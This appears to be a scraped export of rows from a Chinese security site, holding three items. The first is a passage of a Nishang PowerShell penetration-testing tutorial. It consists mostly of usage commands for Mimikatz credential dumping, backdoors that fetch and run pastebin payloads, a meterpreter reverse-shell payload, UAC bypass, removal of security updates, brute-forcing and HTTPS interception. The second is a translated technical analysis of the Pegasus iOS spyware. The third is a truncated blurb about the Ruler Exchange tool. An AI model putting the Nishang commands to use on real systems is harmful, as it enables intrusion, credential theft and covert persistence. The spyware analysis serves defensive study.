Get-PassHintsShow-TargetScreen使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者Powercat来进行监听。在本地使用支持MJPEG的浏览器（如：Firefox）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。PS &gt; Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443 //将远程的画面传送到192.168.230.1的443端口测试 Victim：Show-TargetScreen -IPAddres 192.168.199.127 -Port 5773 -ReverseAttacker：nc.exe -nlvp 5773 | nc.exe -nlvp 9000 //这里我使用的NC，也可以用Powercat本机访问：127.0.0.1:9000Invoke-MimikatzMimikatz大家都非常熟悉了，就不再介绍了 执行方式：Invoke-Mimikatz -DumpCerts //Dump出本机的凭证信息Invoke-Mimikatz -DumpCreds -ComputerName @(""computer1"", ""computer2"") //Dump出远程两台计算机的凭证信息Invoke-Mimikatz -Command ""privilege::debug exit"" -ComputerName ""computer1"" //在远程一台机器上运行Mimikatz并执行""privilege::debug exit""1.域相关脚本Get-Unconstrained查找域内开启了Kerberos Unconstrained Delegation的机器。 执行方式：PS &gt; Get-Unconstrained //返回开启的计算机名PS &gt; Get-Unconstrained -Details  //返回更详细的信息关于”通过Kerberos Unconstrained Delegation获取到域管理员”： http://www.freebuf.com/articles/terminal/98530.html2.Antak WebshellAntak一个ASPX的Webshell，通过这个Webshell可以编码、执行脚本，上传、下载文件。 执行方式：上传Webshell后把它当成一个正常的Powershell执行窗口来使用上传和下载文件，只需要填写好对应路径点击上传、下载按钮即可关于Antak Webshell的更多介绍，请参考： http://www.labofapenetrationtester.com/2014/06/introducing-antak.html3.后门HTTP-BackdoorHTTP-Backdoor可以帮助我们在目标机器上下载和执行Powershell脚本 执行方式：PS &gt; HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis下面解释下几个比较重要的参数：CheckURL 给出一个URL地址，如果存在我们MagicString中的值就去执行Payload - 下载运行我们的脚本PayloadURL 这个参数给出我们需要下载的Powershell脚本的地址Arguments 这个参数指定我们要执行的函数StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行DNS_TXT_Pwnage利用DNS隧道来进行信息传输、通信的小技巧已经不少见了。在Nishang中也集成了一个通过DNS TXT来接收命令或者脚本的后门脚本。使用DNS_TXT_Pwnage这个脚本，我们一般需要配合Utility下的Out-DnsTxt使用。 所以这里首先说下Out-DnsTxt的使用：PS &gt;Out-DnsTxt -DataToEncode path //path处是你想编码的内容的路径之后，它会生成一个编码后的文件，如下图所示然后我们去添加对应的TXT记录就行了，encoded.txt文件中每一行为一条记录 添加完后我们还需要添加两条TXT记录，内容为start和stop 添加完成后，我们就可以利用DNS_TXT_Pwnage这个脚本了 执行方式：PS &gt;DNS_TXT_Pwnage -startdomain start.test.com -cmdstring start -commanddomain command.test.com -psstring test -psdomain xxx.test.com -Subdomains 1 -StopString stop具体参数的意思：startdomain 会一直去检测我们指定域名的TXT记录，并把返回的记录与我们输入的cmdstring以及psstring进行比较cmdstring 是我们任意输入的字符串，如果startdomain与我们这里输入的cmdstring值相等则执行commanddomain命令commanddomain 创建的执行命令TXT记录的域名psstring 是我们任意输入的字符串，如果与我们这里输入的psstring值相等则执行psdomain脚本psdomain 是我们创建的执行脚本TXT记录的域名Subdomains 是执行脚本创建TXT记录的个数StopString 是任意输入的字符串，如果这里输入的字符串与startdomain中返回的记录相同将会停止执行我们的PayloadArguments 指定要执行的函数名Execute-OnTime执行方式：PS &gt; Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload具体参数的意思：PayloadURL 指定我们脚本下载的地址Arguments 指定执行的函数名Time 参数可以设定脚本执行的时间（例如 -Time 23:21）CheckURL 参数会检测我们一个指定的URL内容是否存在StopString给出的字符串，如果发现了就停止执行Gupt-BackdoorGupt-Backdoor这个脚本可以帮助我们通过无线SSID反弹后门和执行命令。 执行方式：PS &gt;Gupt-Backdoor -MagicString test -Verbose这里解释一下MagicString这个参数： MagicString开头的4个字符是用来识别我们建立的WIFI SSID的。例如，这里是test，Gupt后门会去自动匹配我们WIFI中SSID以test开头的。而MagicString这个参数从第五个字符开始就决定了我们是执行命令或是下载脚本。 需要注意的是：如果它的第五个字符是c就代表执行命令。 例如：-MagicString testcwhoami 就会匹配WIFI SSID为test的，并执行命令whoami如果它的第五个字符是u的话就代表下载脚本。 例如：-MagicString testuXXXX 就会匹配WIFI SSID为test的，并默认下载http://goo.gl/XXXX （其中http://goo.gl可在脚本的$PayloadURL参数中修改）还可以用Arguments参数来指定下载脚本 例如： PS &gt;Gupt-Backdoor -MagicString test -Argument Get-Information -Verbose 就可以下载Get-Information的脚本了补充 Windows下创建一个WIFI：cmdnetsh wlan set hostednetwork mode=allownetsh wlan set hostednetwork ssid=test key=1234567890netsh wlan start hostednetworkAdd-ScrnSaveBackdoor这个脚本可以帮助我们利用Windows的屏保来留下一个隐藏的后门 执行方式：PS &gt;Add-ScrnSaveBackdoor -Payload ""powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"" //使用这条语句可以执行我们自己的PayloadPS &gt;Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis //利用这条命令可以从powershell执行一个HTTP-BackdoorPS &gt;Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1  //还可以使用msfvenom先生成一个powershell (./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f powershell)，然后利用这条命令返回一个meterpreter其他具体的参数的意思和我们上面介绍的一些后门是类似的PayloadURL 指定我们需要下载的脚本地址Arguments 指定我们要执行的函数以及相关参数Invoke-ADSBackdoor这个脚本是使用NTFS数据流留下一个永久性后门。其实，由NTFS数据流带来的一些安全问题的利用并不少见了（如：利用NTFS数据流在Mysql UDF提权中创建lib/plugin目录），大家可以参考《NTFS ADS带来的web安全问题》 这个脚本可以向ADS中注入代码并且以普通用户权限运行 执行方式：PS &gt;Invoke-ADSBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor ""http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis这个脚本主要有两个参数，在上面介绍其他后门当中已经说明了，这里是类似的 需要说明的是，执行后它会在AppData的目录下建立一个ads并把我们的Payload注入进去，如果我们希望在cmd下看到我们这里建立的ads，需要使用：dir /a /r4.客户端对于这一部分的脚本，我就不再赘述了，因为网上早已经有了对于这一部分脚本的介绍说明： 使用Powershell Client进行有效钓鱼5.权限提升Enable-DuplicateToken这个脚本可以帮助我们在已经获得了一定权限的情况下，使我们提升到System权限。 执行方式PS &gt; Enable-DuplicateToken具体的相关介绍可以查阅： https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/Remove-Update这个脚本可以帮助我们移除系统所有的更新，或所有安全更新，以及指定编号的更新。 执行方式： PS &gt; Remove-Update All       //移除目标机器上的所有更新PS &gt; Remove-Update Security  //移除目标机器上所有安全相关更新PS &gt; Remove-Update KB2761226 //移除指定编号的更新Invoke-PsUACmeInvoke-PsUACme使用了来自于UACME项目的DLL来Bypass UAC。上表给出了各种UAC绕过的方法，我们可以在Invoke-PsUACme中指定相应方法执行。 执行方式：PS &gt; Invoke-PsUACme -Verbose //使用Sysprep方法和默认的Payload执行PS &gt; Invoke-PsUACme -method oobe -Verbose //使用oobe方法和默认的Payload执行PS &gt; Invoke-PsUACme -method oobe -Payload ""powershell -windowstyle hidden -e YourEncodedPayload"" //使用-Payload参数可以自行指定要执行的Payload除开以上而外，我们还可以使用-PayloadPath参数来指定Payload的路径，默认情况下Payload会在C:\Windows\Temp\cmd.bat结束。还可以使用-CustomDLL64（64位）或-CustomDLL32（32位）参数来自定义一个DLL文件。6.扫描Invoke-BruteForce这个脚本可以对SQL Server、域控制器、Web以及FTP进行口令的爆破 执行方式：PS &gt; Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose //爆破域控制器PS &gt; Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose  //爆破SQL ServerPS &gt; cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose  //爆破server.txt中所有servers的SQL Server主要的参数：ComputerName 用于指定对应服务的计算机名UserList 用户名字典PasswordList 密码字典Service 服务类型（注意默认为：SQL）StopOnSuccess 成功找到一个后就停止执行Invoke-PortScan利用这个脚本我们可以在目标机器上对内网进行端口扫描 执行方式：PS &gt;Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80主要的参数：StartAddress 扫描范围开始的地址EndAddress 扫描范围结束的地址ScanPort 进行端口扫描Port 指定扫描端口（默认扫描端口：21,22,23,53,69,71,80,98,110,139,111, 389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）TimeOut 设置超时时间7.中间人Invoke-Interceptor这个脚本可以通过建立一个代理服务器的方式来拦截HTTPS的请求，并将这些请求记录下来 执行方式：PS &gt;Invoke-Interceptor -ProxyServer 192.168.230.21 -ProxyPort 3128 //这条命令将默认在8081端口监听并把请求发送给上游代理的3128端口可以通过ListenPort来修改我们目标机器上的监听端口（默认8081端口） 例如 我们在目标机器上执行：然后这里本机我用NC来监听对应端口：接收到了来自目标机的请求数据 并且这个脚本会在目标机的TEMP目录下生成interceptor.log的文件来记录请求数据 0x03 结语Nishang这款基于PowerShell的渗透测试专用工具集成了非常多实用的脚本与框架，方便我们在渗透测试过程之中使用。尽管，在一些环境下我们可能没有办法去执行Powershell，但是通过查看这些脚本的具体代码，我们也可以自己去完成实现脚本提供的一些功能。限于篇幅，本文只能抛砖引玉地介绍Nishang的部分功能，希望大家能够在实际的应用之中去体验。参考1. http://www.labofapenetrationtester.com/ 2. https://github.com/samratashok/nishang/","2016-11-18 15:13:43","安全工具","Powershell 渗透测试工具-Nishang（二）","http://nsoad.com/Security-tools/20161118/tools-804.html"
"5ccbfb0c4f2f0a0a7a69c101","事件介绍这篇报道是关于最近发生的在全球范围内活跃的APT间谍软件的深度研究，Lookup团队已经捕获了样本，并且在一台全新的iOS设备上进行了深度研究。NSO集团提供的间谍软件","blackhold","事件介绍这篇报道是关于最近发生的在全球范围内活跃的APT间谍软件的深度研究，Lookup团队已经捕获了样本，并且在一台全新的iOS设备上进行了深度研究。NSO集团提供的间谍软件套装名为Pegasus（可戏称为天马流星拳），Pegasus是一套高度定制化和自动化的间谍软件，其内置三叉戟（3个iOS的0day漏洞组合），可以有效刺破iOS的安全机制，抵达内核，完全控制手机，然后窃取其中数据。运用动态库hooking的方式来破坏内核层与应用层的安全机制，包括且不限于语音、电话、GMAIL、FACEBOOK、WHATSAPP、FACETIME、VIBER、WECHAT、TELEGRAM等等，不管是苹果的内置应用还是第三方应用，完全不能幸免（因为拿到了root权限，监控软件的进程已经是上帝模式）。Pegasus所使用的三叉戟漏洞，已经被苹果在最新的iOS 9.3.5中修补完成，下文中将对其进行详细的介绍。根据最新的报道，NSO集团从2010年开始就已经出售武器化的监控软件套装给企业和组织，到眼前被发现为止已经存在了很长一段时间来了，其宣称组合使用了高维度的系统组合漏洞来完成渗透和攻击，可以轻易地进入iOS、安卓和黑莓系统，窃取其内部信息。这款间谍软件高度隐蔽并且模块化，易于定制。它使用了高强度的加密来保护自身不被传统杀毒软件发现，并且保证被发现之后进行“自爆”，提高取证难度。我们的报告指出三叉戟漏洞包含以下三种漏洞的组合：CVE-2016-4657：Safari的Webkit内核上的内存泄露漏洞，用户点击之后攻击者可以占领这台机器。CVE-2016-4655：内核信息泄露漏洞绕过KASLR，攻击者可以计算出内核的基质，锁定内核的位置。CVE-2016-4656：iOS内核内存漏洞导致越狱，不管是32位还是64位均可以越狱其内核，并安装监控软件。根据代码显示，这款间谍软件套装至少存在了超过两年的时间，代码里显示部分配置适配于iOS 7，这个版本苹果在2013年就发布了。Pegasus利用了我们的生活已经离不开移动手机这一特点，手机是一款一直联网的终极信息管理终端。手机用户觉得他们的手机非常安全，毫无破绽，他们使用手机来发送/接受位置、打电话发送语音、进行社交和工作，但是他们不知道其实手机已经被Pegasus完全监控了，他们的一举一动均在NSO集团的掌握之中。Pegasus的一份授权卖25000美元，他们卖掉了300份授权，得到了超过800万美元的收入。这份报告深入研究了Pegasus从开始到结束的技术细节，包括三叉戟漏洞的利用细节，以及监控组件的技术实现，让大家看一看一款监控软件究竟可以干哪些事情，并且做到什么地步。三叉戟漏洞是最新的漏洞，一直到iOS 9.3.4版本依然有效，直到我们跟苹果合作，推出了9.3.5之后，才偃旗息鼓。请升级到最新的9.3.5，以确保自己的手机安全。0×01.背景随着移动设备进一步的渗透进我们的日常生活当中，恶意软件作者就瞄上了这块巨大的市场，持续的开发木马间谍软件运行于受害者的设备上，受害者却浑然不知。这些暗黑的项目中，有些是为了谋财，例如广告木马、银行卡木马、或者短信欺诈，有些则是为了窃取组织或者个人情报，例如高度定制的系统级别木马，在受害者毫不知情的情况下，偷偷把信息传回控制服务器。间谍软件通常可以做到收集受害者的短信、联系人、通话记录、通话录音，或者远程开启摄像头和麦克风，对目标进行监听和监视。包括录下声音和视频，传回控制服务器。有些间谍软件甚至可以做到传播病毒和木马，以受害人手机为基础和跳板，进一步攻击最终目标。这项技术非常复杂和冒险，攻击者往往得掌握着目标系统的0day漏洞才能成功。所以不管是私人安全公司还是企业系统均推出漏洞回馈计划，有偿征集系统漏洞。两家私人安全公司Gamma集团和Hacking Team公司，自从被爆出开发了移动平台监控软件并出售给政府机构之后，都上了各大媒体头条。这些监控软件造价不菲，功能丰富，往往只有大金主才能使用，里面内置的0day漏洞更是确保其行动万无一失。以色列NSO集团平时行事低调，不显山不露水，这次行动已经进行了五年之久，也没人发现。这家由Niv Carmi，Shalev Hulio，和Omri Lavie在2010年建立的NSO集团宣称，已经把自己开发的监控软件卖给了各国的政府集团。他们宣传自己的监控软件是无法被检测的，其中以为创始人还说：“我们是名副其实的魅影”。私人公司费城兄弟在2014年以1.1亿美元收购了NSO集团。在此之外，NSO集团还组建了移动软件安全公司Kaymera，既射门，又守门，风光无限，一时无两。0×02.时间线2016.08.12 Citizen Lab报告监控软件给Lookout团队2016.08.15 两家团队合作分析这款间谍软件所使用的技术之后，提交给了苹果2016.08.25 苹果释放9.3.5更新，封堵漏洞Pegasus间谍套装攻击的方式很简单，有效载荷的传播也是静默方式。攻击者给受害者发送一个URL，可以是短信、邮箱、社交软件或者任何其他方式，受害者仅需点击一下链接，服务器就开始向受害者的手机传输攻击载荷，远程越狱受害者的手机，然后安装监控软件。一切都是在受害者不知情的状况下发生的，受害者唯一可以察觉的就是按下这个链接之后，浏览器自动退出了。监控软件包含木马代码和程序，用来监控、收集数据并且上传到服务器，受害者的一举一动尽在攻击者的掌握之中。监控软件可以完全控制以下软件：GMAIL，FACETIME，FACEBOOK，LINE，MAIL.RU，CALENDAR，WECHAT，SURESPOT，TANGO，VIBER，SKYPE，TELEGRAM，KAKAOTALK。为了达到完全静默监控，监控软件不会下载这些软件的木马版本，重新安装到受害者手机上。而是采用预装的版本，包括系统软件和用户安装的软件。一般情况下，iOS的系统是为软件做好分离设计的，软件之间是无法通信甚至无法知道对方存在的。但是越狱后的系统确是可以通过hooking的方式来监控其他软件的。三叉戟软件套装通过加载其动态链接库到目标进程的方式，可以应用于hook那些安装有Cydia Mobile Substrate框架的软件。这个框架在越狱社区非常有名，三叉戟套装也使用了这个框架。用户感染了Pegasus之后，手机处于完全的监控状态之中，包括电话录音，通话记录，短信，麦克风/摄像头实时通信（几乎变成对讲机）。在这个阶段获取到信息之后，监控者可以将这些信息用于下个阶段的入侵，例如拿到你的银行卡账户和密码，拿到邮箱账户密码，以及社保等等。受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的三叉戟漏洞，以确保进攻成功进行。阶段一：传递Safari内核的Webkit漏洞，这个阶段是诱使受害者点击一个网站地址，诱发漏洞，执行代码，位32位机器和64位机器分别下载用于下个阶段的代码；阶段二：这个阶段是执行上个阶段下载来的代码，代码是一段加密后的乱码。每个下载都是用单独的密码单独加密的，传统的云端特征码检测技术在此失效（大多数杀软均采用特征码技术），这些代码中含有内核基质定位代码和UAF漏洞利用代码，并且包含了代码解密程序。在此阶段内核基质被定位并被越狱。阶段三：这个阶段设备开始安装上个阶段下载解密好的监控程序Pegasus，并且动态库hooking到想要监控的程序，程序也会检测设备是不是已经通过其他方法越狱过，如果是，则移除任何第三方控制方式（例如SSH），使其成为Pegasus专属监控设备。程序也会监控三个阶段的执行是否成功，如果失败（或者特定状态下），则清除自身不留痕迹，春梦了无痕。阶段三使用的程序部署在一个tarball里面（test222.tar）,每段代码都有其自己的目的，稍后详述。# ca.crt - root keystore中的TLS certificate # ccom.apple.itunessotred.2.csstore - standalone模式的JavaScript代码，会在重启时执行。用于在重启时执行未签名的代码以及静默维持jailbreak。# converter - 根据pid来入侵dylib。这只不过是把Cydia开源软件库中的cynject程序重命名而已。# libaudio.dylib - 通话录音的基础库# libimo.dylib - imo.im的嗅探库# libvbcalls.dylib - Viber的嗅探库# libwacalls.dylib - Whatsapp的嗅探库# lw-install - 安装换新所有嗅探库# systemd - 发送报告及文件到服务器# watchdog# worked - SIP模块我们检测到的攻击最高可以用于iOS 9.3.4版本，攻击者维护着一份庞大的代码库用于攻击iOS从7到9.3.3，我们检测的代码中没有9.3.4的配置信息，但是对于9.3.4版本依然有效（我们知道9.3.4的发布，仅仅是为了封堵盘古团队手上的漏洞，盘古团队手上的漏洞可以越狱到9.3.3）。所以我们推荐大家升级到9.3.5。另外一个特性就是，标准的越狱检测程序无法检测到设备已经越狱，因为攻击者的目标是尽可能的隐蔽。所以受害者的设备哪怕在专业程序的检测下，依然是“未越狱”的状态。0×03.专业开发团队Pegasus有着模块化的设计，简单高效。比如它维护者一份magic table，用来分辨不同设备，不同iOS版本号下的内核内存基址，iOS 9.2.1在iPhone 6上的内核内存基址如下图所示：这样就算出了每个程序在内存中的地址（基于内核地址的偏移量），这个信息在破解时帮了大忙。另外，模块化的代码命名方式对于我们的剖析内部构造也是非常有力，例如libwacalls就是Whatsapp的嗅探库，libvbcalls就是Viber的嗅探库，代码及其高效简洁，这跟其他木马作者不同，其他作者总是尽全力隐藏其目的，而Pegasus是木马界的一股清流。还有，程序健壮，高可用也是充分保证的，哪怕在最初阶段我们也发现了他们的debugging代码和QA标准，这些都是企业级别测试组织流程。0×04.革命性的软件这款木马已经运作了数年，这足以让我们产生给它颁发一座软件健壮大奖的冲动，并且它还支持所有ihone型号上运行的所有iOS版本，从iPhone 4s到iPhone 6s Plus。这是一段证明其适用于iOS7 （发布于2013年）的代码片断。剖析“三叉戟”漏洞这套间谍软件内置了三个iOS系统内核漏洞，这里称之为“三叉戟”漏洞。这套漏洞组合在iOS 9.3.3上被发现，在9.3.4版本上也运行良好，于9.3.5版本被苹果封堵。0×05.CVE-2016-4657：Safari的Webkit内核上的内存泄露在Safari的Webkit内核上存在的内存崩溃漏洞，使攻击者可以执行任意代码。Pegasus利用这个漏洞在Safari的进程中获取初始化代码执行权限。这个漏洞比较复杂，我们将继续分析，持续报道。0×06.CVE-2016-4655：内核信息泄露漏洞绕过KASLR在Pegasus可以执行jailbreak之前，它必须先知道内核位于内存的哪里。苹果的内核基址随机化技术使得内核在内存中出现的方式完全随机，找不到内核在哪里，攻破内核更是无从谈起了。Pegasus利用了iOS内核读取栈数据时缺乏边界检查，导致Pegasus能够获取栈上额外的数据，而函数的返回地址一般会被保存在栈上，刺探到了内核的基址。0×07.CVE-2016-4656：iOS内核内存漏洞导致越狱这个漏洞则是一个典型的UAF漏洞，通过精心构造数据可以在Free之后先分配对象来重新占用之后再触发Use，也可以进一步转换成double free，获取内核态的执行权限从而执行越狱代码。0×08.越狱维持技术一旦内核被攻破了，Pegasus开始准备安装越狱环境。# 关闭内核保护措施，例如代码签名# 重新挂载系统分区# 清除Safari的缓冲区（清除攻击痕迹）# 写入越狱文件（包含主要加载器 /sbin/mount_nfs）在上一节的阶段二中，Pegasus会移除/etc/nfs.conf导致文件系统加载/sbin/mount_nfs（这就是阶段三的越狱加载器），/sbin/mount_nfs是以root的权限运行的，所以越狱软件接管了系统的完整权限。阶段三结束后，Pegasus需要在重启后也继续维持越狱状态，所以使用一段jsc二进制代码替换了系统中的rtbuddyd，并且链接到CVE-2016-4657，达到越狱持久化。木马分析Pegasus是我们检测过的最隐蔽和最高效的间谍软件套件。它使用神话般的方式来安装和隐藏自己，一旦它跻身系统之中，它有一连串方式来隐藏通讯和达到反查杀的功能，并且hook到root和mobile进程中来收集系统和用户信息。0×09.安装和持久化软件在阶段三运行lw-install时安装到受害者手机上。Lw-installl负责了持久化的的大部分设计功能，包括重启后持续接管，以及另外一些小手段防止手机变砖。Lw-install做的第一件事情，就是检查iOS的版本号，根据手机运行的是iOS 9还是之前的版本执行不同的代码。如果用户手机安装的是iOS 9，lw-install会运行.plist上的/sbin/launchctl load 拖到/Library/LaunchDeamons（这个目录通常是空的，或者用于存放越狱后开机启动plist服务列表，例如SSHD），这样可以保证重启后立即运行。如果运行的不是iOS 9，lw-install会先删除一些数据，然后运行代码，log文件在这里/private/var/wireless/Library/com.apple.wifid.r.log。0×0901.持久化技术：JSC提权Pegasus用jsc开发工具来实现越狱持久化，这个组件是包含在iOS环境之中的，其功能是使用户可以在Webkit浏览器之外运行JavaScript代码。在这个组件里的内存崩溃漏洞使得Pegasus执行代码得到了持久化的能力。持久化过程中，rtbuddyd这个守护进程被一段签名过并有着运行权限的jsc代码替换。系统重启时，在early-boot阶段假的rtbuddyd会运行，链接到com.apple.itunesstored.2.cstore文件，这个文件的结构与CVE-2016-4657类似，再次载入攻击脚本攻破内核，进行越狱。过程如下：# 运行jsc代码 –early boot# 运行攻击代码找到内核基址# 攻击内核越狱# 释放Pegasus监控套件，systemd、watchdogd。上一次分析中我们就提到，Pegasus的自我保护和反侦察功能是优先于监控功能的。也就是说，宁可不再监控，也要保护自己不被发现，因为一旦被发现、分析（这就是我们现在在做的事情），马上就会变成众矢之的，尸骨无存了。所以，Pegasus有一大堆功能来保持其隐蔽性和静默性，它持续地监控手机状态并且阻止任何其他的方法来越狱/连接手机，并且当纸包不住火时，它有完整的自毁功能，从手机里完整的移除自己。0×0902.禁用更新阶段三禁用了软件更新，使手机无法收到任何软件更新提示信息。0×0903.检测越狱状态阶段三会检测手机是否已经越狱；Pegasus每次启动时也会检测一次是否越狱。0×0904.监控设备为了可以持续监测和通讯，Pegasus禁用了系统的“深度睡眠”功能。（so那些受害人需要频繁充电？）软件也在监测电池状态。同时监测网络状态，查看是否是运营商网络或者wifi网络，可能是用于选择何时合适将所有数据上传服务器。0×0905.静默上传至C&amp;C服务器Pegasus拥有多种静默通信方式，systemd貌似使用的是短信方式。尽管看上去像一条来自谷歌的密码重置短信，这个短信实际上是发给Pegasus的更新C&amp;C服务器的指令命令行。Pegasus可以接受5种像这样的命令短信，指令ID是验证码中的最后一位，在这个例子中就是9。这个功能可以在http或者https不可用的时候，C2（C&amp;C中继服务器）服务器框架也下线的时候，这个功能就是Pegasus最后的救命稻草，指导它去发现新的C2服务器，这项前无古人的设计，确保了哪怕服务端已经完全down掉，发个短信也能迅速换新Pegasus。短信的姿势可以是这些：0×0906.自毁Pegasus有高度敏感的反侦察系统，保证其不被发现，当其貌似即将暴露的时候，它就会开始自毁进程，并且移除李鬼版本的rtbuddyd和com.apple.itunesstored.2.csstore 。0×10.收集数据收集数据作为Pegasus监控软件的默认功能，是我们见过的间谍软件中最高效完备，兼容性最高的。它收集所有有价值的信息，例如密码、联系人、日历以及其他高价值信息的敲门砖，包括Sms，calendar，address book，gmail，viber，Facebook，Whatsapp，line，kakao，WeChat，surespot，IMO.im，mail.ru，tango，VK，odnoklashniki。0×1001.日历作为高价值信息，Pegasus当然想要受害者的日历。Systemd进程会抓取VCAL文件并通过短信发送出去。0×1002.联系人Pegasus会抓取受害者的所有联系人信息。0×1003.GPS信息Pegasus会抓取设备的GPS信息并发送出。0×1004.捕获用户密码0×1005.捕获Wifi和路由器密码Pegasus为了偷到用户的所有密码，会分析抓取所有的wifi的SSID ，wep/wpa密码。已经苹果的路由器airport，time capsule等等。0×11.拦截电话与短信Pegasus在后台安装好语音（libaudio.dylib）与短信（libimo.dylib）窃听库，这些库非常健壮，但是还有一些特制的库用于拦截关键协议。Libaudio.dylib库注册了许多观察接口，这些观察接口由Pegasus旗下众多模块发送ID进行触发，在下面的例子中libwacalls和libvbcalls触发了观察接口，请见下图。0×1101.进程注入：converterPegasus使用converter来实时动态注入通讯软件进程空间（例如Whatsapp），converter来源于cynject（这是Cydia的开源项目）。这个库使用一个pid作为参数，然后使用Mach内核API注入一个dylib到目标进程，converter的使用方式如下：另外，converter还有一个失败模式，监听键盘上的一个键，用来上传一个自定义的dylib。0×1102.SkypePegasus会抓取所有的Skype通话记录，包含录音。0×1103.Telegram0×1104.WhatsappPegasus使用动态链接库libwacalls.dylib来hook Whatsapp的关键进程并且监听各种通信手段，通过我们捕获的样本，可以看出Pegasus已经对Whatsapp拥有了完整的拦截权限。Whatsapp在通话接通、打断或者结束的时候libwacalls会发出系统级通知，其他软件会接收到信号在他们知道ID的情况下，Pegasus的通知信号是独特的并且并不复杂，他们是由56个字符组成的字符串，看上去是由sha224产生的。Pegasus的其他模块会监听这些ID并且开始工作。在Whatsapp的情况下我们发现这些信号由libwacalls发出，最终由libaudio.dylib捕获并且开始录音，录制受害者的通话内容。Libaudio.dylib把来自于Whatsapp的通话录音保存在以下文件夹：# micFileName - /private/var/tmp/cr/x.&lt;call_id&gt;.caf# spkFileName - /private/var/tmp/cr/t.&lt;call_id&gt;.caf# sentryFileName - /private/var/tmp/cr/z.&lt;call_id&gt;.cafLibwacalls.dylib首先通过试图尝试连接/usr/lib/libdata.dylib的文件的存在来确认Cydia Mobile substrate是否安装在系统里，否则继续执行解密字符串来定位需要hook的类和方法。Libwacalls.dylib负责hook CallManager类下的以下方法：# setCallConnected# setCallInterrupted# setCallInterruptedByPeer# endCall还有CallLogger类里的addCallEvent方法。所有的hook都依赖于系统通知机制IPC。0×1105.Viber我们捕获的样本中，Viber的hook动态库libvbcalls会抓取所有的Viber通信记录。Libvbcalls的hook方式与libwacalls类似，当电话接通和结束的时候，libvbcalls也会发送ID。CallEnded用来hook通话的结束时间并且发送系统级的ID。下列ID是libvbcalls发送的。# onCallStarted : eb899b6873eb166859e610915dd002ea21b6057bd31fc6c1b38f27e2# onCallEnded : b79cd49420fbeba629a0290bc890c66924dd8452d0c2fd5ba9b327d0Libaudio.dylib收到ID后开始录音，并且把通话保存到下列文件夹：# micFileName - /private/var/tmp/cr/x.&lt;call_id&gt;.caf# spkFileName - /private/var/tmp/cr/t.&lt;call_id&gt;.caf# sentryFileName - /private/var/tmp/cr/z.&lt;call_id&gt;.caf0×12.实时监控为了能够监控手机的所有输入和输出，Pegasus可以实时录制音频和视频。就好像Omri Lavie在Financial Times所说的“你们的手机现在就跟对讲机没啥区别”，请见下文函数：结论我们依赖手机来存储数码资产，手机一直带在身边已经成为了我们的语音、视频、文字一体化通讯系统。里面的很多秘密，成为罪犯的攻击目标。NSO集团作为网络武器商，拥有数百名员工，并且每年收入数百万美元。NSO只是一个例子，但是我们知道他并不是唯一的一个，就像我们知道的Hacking Team，Finisher，还有其他的互联网组织。这个软件只是iOS版本，据报道还有Android和Blackberry版本。这份文件告诉我们，维持手机系统版本up to date的重要性，还有就是即使是最新版的软件，也要保持警惕。0×13.附录A：TLS证书信息0×14.附录B：越狱检测IOCs信息原文地址：https://info.lookout.com/rs/051-ESQ-475/images/lookout-pegasus-technical-analysis.pdf参考地址1：http://blog.pangu.io/pegasus-apt/参考地址2：http://www.freebuf.com/news/112967.html*本文译者：Roy_Chen，转载须注明来自FreeBuf.COM","2016-08-30 19:00:45","系统安全","Pegasus间谍套件内部原理及流程剖析","http://nsoad.com/Article/system/20160830/333.html"
"5ccbfb0c4f2f0a0a7a69c102","小介绍Mooder是一款开源、安全、简洁、强大的（安全）团队内部知识分享平台，基于Django、全封闭保证私密性、支持Markdown、支持Postgres/Mysql/Sqlite等多种数据库、支持","Kong","Ruler是一款能够通过MAPI/HTTP协议与Exchange服务器交互的工具。其目的在于测试outlook客户端的邮件规则，规则详情请见：Silentbreakblog。Silentbreak对该攻击行为的研究非常到位，给我们带来了极大的便利。唯一的缺点是它的安装时间过长。复制邮箱到一个新的Outlook实例比较耗时。创建邮件规则也相对麻烦。那么有人可能会问，难道就没有更好的payload生成器么？因此Ruler就这样诞生了。 Ruler的实现方式和MAPI的相关资料请参见博客：SensePostblog运行demo的链接地址：Ruler 